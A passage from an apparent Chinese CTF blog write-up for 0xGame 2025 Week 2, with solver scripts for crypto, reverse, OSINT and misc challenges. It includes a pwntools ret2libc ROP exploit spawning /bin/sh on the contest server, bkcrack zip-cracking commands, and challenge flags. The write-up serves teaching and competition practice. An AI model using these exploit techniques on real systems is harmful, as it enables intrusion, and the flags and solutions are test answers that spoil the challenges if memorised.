如果多个步数都得到合法字节，需要选择，这里先取第一个\n                        # 实际上应该检查一致性，我们先简单处理\n                        pass\n            if possible_byte is None:\n                break\n            plain.append(possible_byte)\n        if len(plain) == len(enc_flag):\n            # 检查是否可打印 ASCII\n            try:\n                text = bytes(plain).decode('ascii')\n                if all(32 <= p < 127 for p in plain):\n                    print(f\"Found: a={a}, b={b}, plaintext = {text}\")\n                    found = True\n                    break\n            except:\n                pass\n    if found:\n        break\n\nif not found:\n    print(\"Not found with given constraints.\")\n```\n\n## PolyRSA\n\n```python\np = Integer(211381997162225534712606028333737323293)\nq = Integer(291844321073146066895055929747029949743)\nn = p * q\ne = 65537\n\n# 定义多项式环\nRp.<x> = PolynomialRing(GF(p))\nRq.<x> = PolynomialRing(GF(q))\nRn.<x> = PolynomialRing(Zmod(n))\n\n# 定义模 x^8 - 1\nSp = Rp.quotient(x^8 - 1, 'a')\nSq = Rq.quotient(x^8 - 1, 'b')\nSn = Rn.quotient(x^8 - 1, 'c')\n\n# 密文多项式系数\nc_coeffs = [40882135200347703593754473549436673146387957409540306808209934514868940052992,\n            13673861744940819052324430973254902841262867940443611208276249322420769352299,\n            14825937682750201471490037222143248112539971745568733623844924679519292569979,\n            38679688295547579683397975810830690182925250157203662993481664387755200460738,\n            48188456496545346035512990878010917911654453288374940837147218298761674630209,\n            573073037892837477865699910635548796182825197336726898256762153949994844160,\n            33191976337303879621137795936787377133622652419928253776624421127421475322069,\n            46680445255028101113817388282005859237776046219558912765486646689142241483104]\n\nc_poly = Sn(c_coeffs)\n\n# 计算单位群阶\norder_p = (p-1)^2 * (p^2 - 1) * (p^4 - 1)\norder_q = (q-1)^2 * (q^2 - 1) * (q^4 - 1)\norder = lcm(order_p, order_q)\nd = inverse_mod(e, order)\n\n# 解密\nm_poly = c_poly^d\n\n# 提取系数\nm_coeffs = [Integer(m_poly[i]) for i in range(8)]\n\nprint(\"解密后的系数:\", m_coeffs)\n\n# 检查系数是否在字节范围内\nfor i, coeff in enumerate(m_coeffs):\n    print(f\"系数 {i}: {coeff} (在 0-255 内: {0 <= coeff <= 255})\")\n\n# 如果在字节范围内，转为字符\nif all(0 <= coeff <= 255 for coeff in m_coeffs):\n    flag = ''.join(chr(b) for b in m_coeffs)\n    print(\"Flag:\", flag)\nelse:\n    print(\"解密失败：系数不在 ASCII 范围内\")\n    print(\"尝试用 long_to_bytes 方式:\")\n    try:\n        flag_bytes = b''\n        for coeff in m_coeffs:\n            # 将大整数转为字节\n            while coeff > 0:\n                flag_bytes = bytes([coeff % 256]) + flag_bytes\n                coeff //= 256\n        print(\"Flag bytes:\", flag_bytes)\n    except Exception as e:\n        print(\"错误:\", e)\n```\n\n得到`0xGame{D0_y0u_l1k3_RSA_w1th_p0lyn0m14l_r1ngs?}`\n\n## CCB\n\n```python\n#!/usr/bin/env python3\n\nfrom base64 import b64decode, b64encode\nimport os\n\n# Given IV\nIV = b64decode(\"Mkoz9OBLUA4EgWqbuheBcg==\")\nprint(f\"IV: {IV.hex()}\")\n\n# Step 1: Create C-B-C pattern\n# We need C1 = C3 != C2\n# \n# For CBC mode:\n# C1 = E(P1 ⊕ IV)\n# C2 = E(P2 ⊕ C1)\n# C3 = E(P3 ⊕ C2)\n#\n# Strategy: \n# 1. Choose P1 and P2 arbitrarily\n# 2. Encrypt to get C1, C2\n# 3. Set P3 = P1 ⊕ IV ⊕ C2 so that P3 ⊕ C2 = P1 ⊕ IV\n#    This makes C3 = E(P3 ⊕ C2) = E(P1 ⊕ IV) = C1\n\nprint(\"\\n=== Step 1: Creating C-B-C ciphertext ===\")\nprint(\"Strategy: Choose P1, P2, then set P3 = P1 ⊕ IV ⊕ C2\")\nprint(\"This will make C3 = C1\")\n\n# For the first encryption, we can choose any P1 and P2\n# But we need to know C1 and C2 to compute P3\n# So we'll need to do this interactively\n\nprint(\"\\nFirst, encrypt with P1=00...00 (16 zeros), P2=01...01, P3=00...00 (temporary)\")\nP1 = b'\\x00' * 16\nP2 = b'\\x01' * 16\nP3_temp = b'\\x00' * 16\nplaintext1_temp = P1 + P2 + P3_temp\nprint(f\"Temporary plaintext (base64): {b64encode(plaintext1_temp).decode()}\")\nprint(\"After getting C1 and C2 from server, calculate:\")\nprint(\"P3 = P1 ⊕ IV ⊕ C2\")\nprint(\"Then encrypt again with the corrected plaintext\")\n\nprint(\"\\n=== Step 2: Creating C-C-B ciphertext ===\")\nprint(\"After getting C and B from step 1:\")\nprint(\"We need C1 = C2 = C and C3 = B\")\nprint(\"\\nStrategy:\")\nprint(\"1. Set P1 such that E(P1 ⊕ IV) = C\")\nprint(\"   So P1 = D(C) ⊕ IV - but we can't decrypt without the key\")\nprint(\"\\nAlternative strategy:\")\nprint(\"Since C1 from step 1 satisfies C1 = E(P1 ⊕ IV),\")\nprint(\"We need to reuse that same P1\")\nprint(\"For C2 = C1, we need E(P2 ⊕ C1) = C1\")\nprint(\"So P2 ⊕ C1 = P1 ⊕ IV\")\nprint(\"Therefore P2 = P1 ⊕ IV ⊕ C1\")\nprint(\"\\nFor C3 = B (which is C2 from step 1):\")\nprint(\"We need E(P3 ⊕ C2) = B\")\nprint(\"Since C2 = C1 (both equal to C), P3 ⊕ C1 = P2_old ⊕ C1_old\")\nprint(\"From step 1, C2_old = E(P2_old ⊕ C1_old) = B\")\nprint(\"So we need P3 ⊕ C = P2_old ⊕ C (where C = C1_old)\")\nprint(\"Therefore P3 = P2_old\")\n\nprint(\"\\n=== Practical Solution ===\")\nprint(\"1. Get IV from server\")\nprint(\"2. Encrypt P1||P2||temp with P1=zeros, P2=ones to get C1||C2||C3_temp\")\nprint(\"3. Calculate P3 = P1 ⊕ IV ⊕ C2\")\nprint(\"4. Encrypt P1||P2||P3 to get C||B||C (C-B-C pattern)\")\nprint(\"5. Calculate P2' = P1 ⊕ IV ⊕ C\")\nprint(\"6. Encrypt P1||P2'||P2 to get C||C||B (C-C-B pattern)\")\nprint(\"7. Get flag!\")\n\n# Helper function to XOR bytes\ndef xor_bytes(a, b):\n    return bytes(x ^ y for x, y in zip(a, b))\n\nprint(\"\\n=== Interactive Solver ===\")\nprint(\"Step 1: Use option 1 to encrypt this plaintext:\")\nP1 = b'\\x00' * 16\nP2 = b'\\xff' * 16  # Changed to all 0xFF to ensure P2 != P1\nP3_temp = b'\\x00' * 16\nplaintext_temp = P1 + P2 + P3_temp\nprint(f\"{b64encode(plaintext_temp).decode()}\")\nprint(\"\\nAfter you get the ciphertext, paste it here (base64):\")\nprint(\"(Or type 'manual' to calculate manually)\")\n\ntry:\n    ct1 = input().strip()\n    if ct1.lower() != 'manual' and ct1:\n        ct1_bytes = b64decode(ct1)\n        C1 = ct1_bytes[:16]\n        C2 = ct1_bytes[16:32]\n        \n        print(f\"\\nC1: {C1.hex()}\")\n        print(f\"C2 (this is B): {C2.hex()}\")\n        \n        # Calculate correct P3 for C-B-C\n        P3 = xor_bytes(xor_bytes(P1, IV), C2)\n        plaintext_cbc = P1 + P2 + P3\n        print(f\"\\n=== C-B-C Plaintext (base64) ===\")\n        print(b64encode(plaintext_cbc).decode())\n        \n        # Calculate P2' for C-C-B\n        P2_prime = xor_bytes(xor_bytes(P1, IV), C1)\n        plaintext_ccb = P1 + P2_prime + P2\n        print(f\"\\n=== C-C-B Plaintext (base64) ===\")\n        print(b64encode(plaintext_ccb).decode())\n        \n        print(\"\\nUse these plaintexts in order when prompted for option 2!\")\n    else:\n        print(\"\\nManual calculation formulas:\")\n        print(\"Given C1||C2||C3 from temporary encryption:\")\n        print(\"P3_correct = P1 ⊕ IV ⊕ C2\")\n        print(\"P2' = P1 ⊕ IV ⊕ C1\")\n        print(\"\\nC-B-C plaintext: P1 || P2 || P3_correct\")\n        print(\"C-C-B plaintext: P1 || P2' || P2\")\nexcept:\n    print(\"\\nUse the formulas above to calculate manually\")\n```\n\n运行上述脚本，它会告诉你应该怎么做，首先选项1把`AAAAAAAAAAAAAAAAAAAAAP////////////////////8AAAAAAAAAAAAAAAAAAAAA==`这个粘进去，注意是base64编码的，所以记得结尾要有`==`,没有记得补上。然后服务器会返回给你加密的内容，粘进脚本里，`Ug7WsyG0J3FNWii4QRq2HQBI5mgU27sArYBi5lVTcR06+3+4x5Tdy5Ec9yMH2Xva`,然后它会给你解出cbc：`AAAAAAAAAAAAAAAAAAAAAP////////////////////8yAtWc9JDrDqkBCH3vRPBv`和ccb：`AAAAAAAAAAAAAAAAAAAAAGBE5UfB/3d/SdtCI/sNN2//////////////////////`,从而得到flag：` 0xGame{fdc902c6-873a-4d92-b366-b6e83bde39f7}`.\n\n## 格\n\n解格：\n\n```python\n# SageMath 代码 (最终版)\n\n# 1. 这是你从程序输出中提供的矩阵\nmatrix_data = [\n    [3284681750909390818306909313921642175535822995982583393933696966300433498618099, 7062920994008607414635543198964747262695143293079919687270285360471612225464116, 9826330432780730699882966183005563282601785988437488502794820428794464309726364, 10313939243981504072492843197821189873801981624046806578030558315476228320733359],\n    [14962120076283198553291772690327243603574931151327631953834236409697046371251172, 10914614871335511269514555072571377171094477247162595307427654861209446389077850, 13813513556033584840229315973248340868169094377335326963200609716900171410846991, 17767016205042422794681474520318417767408504251129953471000646286235093083687535],\n    [15880849953718488589631767682500857705255547835146769369286551172642086223544654, 23536981063518946472925309088916542857554725764823718161707669971432320275459487, 26927812823530065718296292087211430992875944789365872721297497760084580766210537, 22230074134750723773334677934743831896859185125095203873930495218095676602198247],\n    [14741023566046737527403024490343979553759831564949552088348125025359384680249250, 8837391869363988214859613817767621920507231139048698235441315423135328237787325, 9720795972355554118334542488724936259246227879278497862252939659284272861952841, 12075839868445672238363457714940958060191660916729079502656993881392627251511248]\n]\n\nM = matrix(ZZ, matrix_data)\n\n# 2. 应用 LLL 算法. 'B' 将是一个完整的 4x4 矩阵.\nB = M.LLL()\n\nprint(\"[+] LLL 规约后的基 (完整的 B 矩阵):\")\nprint(B)\n\nfound_secret = False\n\ndef recover_secret(vector, vector_name):\n    global found_secret\n    if found_secret: return\n\n    print(f\"\\n--- 正在检查向量: {vector_name} ---\")\n    for direction in [1, -1]:\n        v_cand = vector * direction\n        if v_cand.is_zero(): continue\n\n        first_nonzero_val = next((val for val in v_cand if val != 0), None)\n        for byte_val in range(1, 256):\n            if first_nonzero_val % byte_val == 0:\n                k = first_nonzero_val // byte_val\n                if k == 0: continue\n                s_cand = v_cand / k\n                if all(c.is_integer() and 0 <= c <= 255 for c in s_cand):\n                    secret_bytes = bytes([int(c) for c in s_cand])\n                    print(f\"[+] 成功! 在 '{vector_name}' 中找到可能的 secret\")\n                    print(f\"[-] secret: {secret_bytes.hex()}\")\n                    found_secret = True\n                    return\n\n# 3. 检查基向量及其简单组合\ncandidates = {\n    \"B[0]\": B[0], \"B[1]\": B[1],\n    \"B[0] + B[1]\": B[0] + B[1], \"B[0] - B[1]\": B[0] - B[1],\n    \"B[2]\": B[2], \"B[3]\": B[3]\n}\n\nfor name, vec in candidates.items():\n    if found_secret: break\n    recover_secret(vec, name)\n\nif not found_secret:\n    print(\"\\n[!] 未能恢复 secret. 问题可能比预想的更复杂.\")\n```\n\n\n\n解密flag：\n\n```python\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import unpad\n\n# 1. PEGA AQUÍ EL TEXTO CIFRADO COMPLETO DE 160 CARACTERES.\n#    El que proporcionaste tiene 156 caracteres (78 bytes), le faltan 4 caracteres (2 bytes) al final.\n#    Asegúrate de copiarlo entero.\nhex_ciphertext = \"83c9b4db1e036eada862d24928ae12641f7e56f713598661600da434cf3bc3e74429cbb807173626516dd030d964ad1f06ef2f9da03722943ba57653c4e0733b8474d57d450b01a331b1bd7ea36dcc4b\" # <--- ¡REEMPLAZA ESTO CON EL VALOR COMPLETO!\n\n# 2. La clave fija del programa.\nkey = b'0xGame2025awaQAQ'\nblock_size = AES.block_size  # 16 bytes\n\n# --- Script de Desencriptación Correcto ---\ntry:\n    full_ciphertext = bytes.fromhex(hex_ciphertext)\n    \n    # Comprobación de la longitud\n    if len(full_ciphertext) % block_size != 0:\n        print(f\"[!] ADVERTENCIA: La longitud del texto cifrado ({len(full_ciphertext)} bytes) no es un múltiplo de 16.\")\n        print(\"[!] Esto indica que el texto cifrado está incompleto. El resultado será incorrecto.\")\n\n    if len(full_ciphertext) < block_size:\n        raise ValueError(\"El texto cifrado es demasiado corto.\")\n\n    # El primer bloque del texto cifrado (C_1) actúa como el IV para descifrar el resto del mensaje.\n    iv_for_decryption = full_ciphertext[0:block_size]\n\n    # El texto cifrado que queremos descifrar es todo lo que sigue al primer bloque (C_2, C_3, ...).\n    ciphertext_to_decrypt = full_ciphertext[block_size:]\n    \n    # Crear un nuevo cifrador CFB usando C_1 como IV.\n    cipher = AES.new(key, AES.MODE_CFB, iv=iv_for_decryption)\n    \n    # Descifrar para obtener (padded_flag + urandom_final).\n    decrypted_payload = cipher.decrypt(ciphertext_to_decrypt)\n    \n    print(f\"[+] Contenido descifrado: {decrypted_payload}\")\n\n    # El mensaje original era: padded_flag(48 bytes) + urandom(16 bytes).\n    # Por lo tanto, el contenido descifrado debería tener 64 bytes.\n    if len(decrypted_payload) < 48: # Necesitamos al menos los 48 bytes de la flag.\n         raise ValueError(\"El contenido descifrado es demasiado corto para contener la flag.\")\n\n    # Aislamos los bloques que deberían contener la flag con padding (los primeros 48 bytes del payload).\n    padded_flag = decrypted_payload[:48]\n\n    # Intentar quitar el padding de la parte de la flag.\n    flag = unpad(padded_flag, block_size)\n    \n    flag_str = flag.decode()\n    \n    if flag_str.startswith(\"0xGame{\") and flag_str.endswith(\"}\"):\n        print(\"\\n\" + \"=\"*40)\n        print(f\"[+] ¡ÉXITO! La flag es: {flag_str}\")\n        print(\"=\"*40)\n    else:\n        print(\"\\n[!] Se descifró un texto, pero no parece tener el formato de la flag.\")\n        print(f\"[!] Texto obtenido: {flag_str}\")\n\n\nexcept (ValueError, IndexError) as e:\n    print(f\"\\n[!] ERROR: No se pudo descifrar la flag. Causa probable: {e}\")\n    print(\"[!] Por favor, comprueba que has copiado el texto cifrado completo (160 caracteres hexadecimales).\")\nexcept Exception as e:\n    print(f\"\\n[!] Ocurrió un error inesperado: {e}\")\n```\n\n得到flag：`0xGame{5adccb16-92b6-4d44-89dd-c1e39f6c9338}`\n\n# Osint\n\n## 机场\n\n根据橙黄色廊桥和西藏航空的飞机(Tibet Airlines)可以确定是`珠海金湾机场`，三字码是ZUH，注意这个是大写，然后用网站上的加密工具进行32位小写md5加密，得到`296d0dd1964288715beb8e2d06dca1a5`,就得到flag了。\n\n# Reverse\n\n## baby_python逆向\n\n- 使用`pyinstxtractor`提取文件，运行`python pyinstxtractor.py babyPy.exe`，从.exe中提取.pyc文件(注意这个工具要和目标程序放在同一个目录下。)\n\n- 使用`uncompyle6`反编译，`uncompyle6 babyPy.pyc > decompiled_code.py`,然后就可以在`decompiled_code.py`这个脚本里找到flag了。\n\n- `0xGame{c2a6d59d-34dc-4b94-96aa-e823bdcb4823}`\n\n## baby_java逆向\n\n- `jar -tf BabyJar.jar`分析文件结构\n\n- ```python\n  # 提取所有 class 文件\n  jar -xf BabyJar.jar\n  \n  # 使用 javap 查看字节码（基础信息）\n  javap -c com/BabyJar/demo/BabyJar.class\n  javap -c com/BabyJar/demo/Encrypt.class\n  ```\n\n​\t查看类的基础信息。\n\n- 找到密文`QsY1V5cX9jJyF2JSAgdikwfCEneTAgICUpNnd1Iyk8IXUkJ3QhcyZ8J3YpY=`   和   加密过程`原始flag → 每个字节 XOR 20 → 交换高低4位 → Base64编码 → 比较`\n\n- 解密：`Base64解码 → 交换高低4位 → 每个字节 XOR 20 → 得到原始flag`\n\n- 完整exp：\n\n  ```python\n  import base64\n  \n  # 硬编码的密文\n  encoded = \"QsY1V5cX9jJyF2JSAgdikwfCEneTAgICUpNnd1Iyk8IXUkJ3QhcyZ8J3YpY=\"\n  \n  # Base64 解码\n  encrypted_bytes = base64.b64decode(encoded)\n  \n  # 逆向加密过程\n  def decrypt(data):\n      result = []\n      for byte in data:\n          # 1. 先交换高低4位（逆向第一步）\n          swapped = ((byte & 0x0F) << 4) | ((byte & 0xF0) >> 4)\n          # 2. 再与 key=20 进行 XOR（逆向第二步）\n          decrypted = swapped ^ 20\n          result.append(decrypted)\n      return bytes(result)\n  \n  # 解密\n  decrypted = decrypt(encrypted_bytes)\n  flag = decrypted.decode('utf-8')\n  print(f\"Flag: {flag}\")\n  ```\n\n  得到flag：`0xGame{73e214d2-d85c-4441-bc17-8e10c0e7b8c2}`.\n\n## 16位程序与asm汇编\n\n数据分两个循环两种加密。每23个字节为一段。\n\n```python\n# 完整加密数据\nencrypted = [\n    0x47, 0x7F, 0x52, 0x78, 0x6C, 0x74, 0x7E, 0x72, 0x47, 0x47,\n    0x73, 0x5A, 0x84, 0x5A, 0x43, 0x85, 0x46, 0x5A, 0x83, 0x6F,\n    0x46, 0x5A, 0x6C,  # 前23字节\n    0x33, 0x30, 0x73, 0x32, 0x75, 0x66, 0x37, 0x61, 0x66, 0x33,\n    0x30, 0x78, 0x66, 0x40, 0x35, 0x61, 0x4E, 0x64, 0x34, 0x65,\n    0x32, 0x33, 0x88   # 后23字节\n]\n\n# 分开两部分\npart1 = encrypted[:23]  # 循环1处理\npart2 = encrypted[23:]  # 循环2处理\n\n# 方法1：先sub 9再xor 0E (循环1)\ndecrypted1 = \"\"\nfor byte in part1:\n    decrypted1 += chr(((byte - 9) & 0xFF) ^ 0x0E)\n\n# 方法2：先xor 0E再sub 9 (循环2)  \ndecrypted2 = \"\"\nfor byte in part2:\n    decrypted2 += chr(((byte ^ 0x0E) - 9) & 0xFF)\n\nprint(\"第一部分:\", decrypted1)\nprint(\"第二部分:\", decrypted2)\nprint(\"完整Flag:\", decrypted1 + decrypted2)\n```\n\n逆向解密，得到：`0xGame{g00d_u_4r3_th3_m45t3r_0f_45m_E2f7a1b34}`\n\n很好，你是汇编大师🥰🥰。\n\n## shuffle\n\nIDA里可以看到打乱的flag：`23-64bed6}-xm5300-{faGa34-0e04c2e7c2a78f39a4`,随机数种子1638，MSVC的标准C语言库生成的随机数，和打乱逻辑:\n\n![shuffle](/images/wp/shuffle.png)\n\n编写逆向脚本：\n\n```python\n for idx in range(len(operations) - 1, -1, -1):\n        i, swap_idx = operations[idx]\n        arr[i], arr[swap_idx] = arr[swap_idx], arr[i]\n    \n    return ''.join(arr)\n\n```\n\n得到flag：`0xGame{5ffa9030-e204-4673-b4c6-ed433aca7228}`\n\n## TELF\n\n010的使用:在光标处键入数据会**自动往后覆盖**，实现替换。(或者选中某块数据然后开始键入，修改替换掉该块的数据。)注意不要删除，删了之后再键入就是继续往后覆盖数据了。这就不能实现该数据块的替换了，反而替换掉了后面不该替换的数据。**删除不要乱点！**\n\n```python\nimport struct\nimport ctypes\n\nlibc = ctypes.CDLL('libc.so.6')  \n\n# 定义 srand 和 rand 函数的原型\nlibc.srand.argtypes = [ctypes.c_uint]\nlibc.srand.restype = None\nlibc.rand.argtypes = []\nlibc.rand.restype = ctypes.c_int\n\ndef get_keys():\n    seed = 0xF6950\n    libc.srand(seed)\n    keys = [(libc.rand()) for _ in range(4)]\n    return keys\n\ndef decrypt(v, k):\n    \"\"\"\n    使用 TEA 算法解密一个 64 位的数据块。\n    v: 一个包含两个 32 位无符号整数的元组 (v0, v1)。\n    k: 一个包含四个 32 位整数的密钥数组。\n    \"\"\"\n    v0, v1 = v\n    delta = 0x9e3779b9\n    num_rounds = 32\n    sum_val = (delta * num_rounds) & 0xFFFFFFFF\n    for _ in range(num_rounds):\n        term1 = ((v0 << 4) + k[2]) & 0xFFFFFFFF\n        term2 = (v0 + sum_val) & 0xFFFFFFFF\n        term3 = ((v0 >> 5) + k[3]) & 0xFFFFFFFF\n        v1 = (v1 - (term1 ^ term2 ^ term3)) & 0xFFFFFFFF\n        term1 = ((v1 << 4) + k[0]) & 0xFFFFFFFF\n        term2 = (v1 + sum_val) & 0xFFFFFFFF\n        term3 = ((v1 >> 5) + k[1]) & 0xFFFFFFFF\n        v0 = (v0 - (term1 ^ term2 ^ term3)) & 0xFFFFFFFF\n        sum_val = (sum_val - delta) & 0xFFFFFFFF\n    return v0, v1\n\ndef main():\n    enc = bytes([\n        0xAD, 0xDA, 0x01, 0xDC, 0xAE, 0x5B, 0x8A, 0x08,\n        0x4E, 0xF5, 0x4F, 0x8F, 0x6E, 0x5F, 0x9D, 0x9E,\n        0x0A, 0x4E, 0xA9, 0x08, 0x25, 0xAB, 0x45, 0xC2,\n        0x4B, 0xC9, 0x8F, 0x43, 0x3D, 0x51, 0xD6, 0x28,\n        0xF6, 0x72, 0xCD, 0xF4, 0x2B, 0xB4, 0x4A, 0x3B,\n        0xFB, 0x36, 0x66, 0xEF, 0xD6, 0x8A, 0x8C, 0xB2,\n        0xEB, 0x1A, 0x9C, 0x1B, 0x0A, 0x9C, 0x1F, 0x53\n    ])\n    keys = get_keys()\n\n    decrypted_flag = b\"\"\n    for i in range(0, len(enc), 8):\n        chunk = enc[i:i+8]\n        v = struct.unpack('<2I', chunk)\n        decrypted_v = decrypt(v, keys)\n        decrypted_chunk = struct.pack('<2I', decrypted_v[0], decrypted_v[1])\n        decrypted_flag += decrypted_chunk\n        flag_str = decrypted_flag.decode('utf-8').rstrip('\\x00')\n        print(f\"{{flag_str}}\")\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\n首先是upx脱壳，但是upx标签被修改成了X1c，用010替换X1c为UPX然后就能脱壳了，脱完之后就能逆向了,得到:\n\n`0xGame{PANDORA-PANRADOXXX-101AP-9CDE02B83F5D6-7B1A9C348}`  flag .\n\n# Misc\n\n## 明文攻击\n\n- 先构造一个png文件，，bkcrack只需要12个字节的明文就能爆破，`89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52`，文件头是这个。\n\n- 运行`bkcrack.exe -C attachment.zip -c huiliyi.png -p 01.png`，爆破得到`cdc564be 5675041f 719adb56`密钥。\n\n- 最后`bkcrack.exe -C attachment.zip -c flag.txt -k cdc564be 5675041f 719adb56 -d flag_decrypted.txt`得到flag\n- `0xGame{Y0u_cRacked_M3!z1p_1s_uNsafe!}`\n","slug":"0xGame2025Week2WP","published":1,"updated":"2025-10-19T03:35:05.170Z","_id":"cmgx44tld0000jst8f92f4noz","comments":1,"layout":"post","photos":[],"content":"<h1 id=\"pwn\"><a href=\"#pwn\" class=\"headerlink\" title=\"pwn\"></a>pwn</h1><h2 id=\"ret2libc\"><a href=\"#ret2libc\" class=\"headerlink\" title=\"ret2libc\"></a>ret2libc</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">io=remote(<span class=\"string\">&quot;nc1.ctfplus.cn&quot;</span>,<span class=\"number\">30264</span>)</span><br><span class=\"line\">main=<span class=\"number\">0x40122D</span></span><br><span class=\"line\">got=<span class=\"number\">0x404018</span></span><br><span class=\"line\">plt=<span class=\"number\">0x401070</span></span><br><span class=\"line\">rdi=<span class=\"number\">0x40119e</span></span><br><span class=\"line\">ret=<span class=\"number\">0x40122c</span></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Input something: \\n&quot;</span>)</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x48</span>+p64(rdi)+p64(got)+p64(plt)+p64(main)</span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;./libc.so.6&#x27;</span>)</span><br><span class=\"line\">base=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-libc.sym.puts</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(base))</span><br><span class=\"line\">sym=libc.sym.system+base</span><br><span class=\"line\">sh=<span class=\"built_in\">next</span>(libc.search(<span class=\"string\">&quot;/bin/sh&quot;</span>))+base</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x48</span>+p64(ret)+p64(rdi)+p64(sh)+p64(sym)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Input something: \\n&quot;</span>)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>先把libc的基址找出来，然后再构造ROP链。</p>\n<h2 id=\"多线程\"><a href=\"#多线程\" class=\"headerlink\" title=\"多线程\"></a>多线程</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">io=remote(<span class=\"string\">&quot;nc1.ctfplus.cn&quot;</span>,<span class=\"number\">32640</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">b&quot;a&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0x40</span>):</span><br><span class=\"line\">    io.sendline(<span class=\"string\">b&quot;2&quot;</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">b&quot;3&quot;</span>)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>得到<code>0xGame&#123;Thr3@ds_c@nn0t_b3_w1th0ut_l0cks&#125;</code></p>\n<h2 id=\"高数😫😫\"><a href=\"#高数😫😫\" class=\"headerlink\" title=\"高数😫😫\"></a>高数😫😫</h2><p><img src=\"/images/wp/eval.png\" alt=\"eval\"></p>\n<p>这个<strong>条件</strong>和<strong>循环</strong>结构够我学一辈子😭😭</p>\n<p>flag：<code>0xGame&#123;Ur_@n_excel1ent_bl@ster&#125;</code></p>\n<h1 id=\"Crypto\"><a href=\"#Crypto\" class=\"headerlink\" title=\"Crypto\"></a>Crypto</h1><h2 id=\"Orcale\"><a href=\"#Orcale\" class=\"headerlink\" title=\"Orcale\"></a>Orcale</h2><p>爆破</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span 